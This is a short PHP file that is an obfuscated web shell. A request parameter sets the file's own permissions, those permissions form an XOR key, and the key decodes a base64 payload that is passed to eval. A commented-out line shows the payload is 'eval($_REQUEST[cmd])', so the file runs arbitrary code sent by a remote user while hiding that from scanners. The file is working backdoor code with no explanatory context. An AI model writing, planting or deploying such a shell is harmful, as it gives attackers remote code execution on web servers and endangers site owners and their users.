<?php
//echo linkinfo('/root');
$c = $_REQUEST[p];
chmod(__FILE__, intval($c));
//$a = 'eval($_REQUEST[cmd]);';
$p = fileperms(__FILE__);
$b = $p.$p.$p.$p.$p.';';
//echo base64_encode($b^$a);
echo $p;
eval(base64_decode('VkVUWB0XbGdxZGZ2ZmBuUF5RaRwI')^$b);
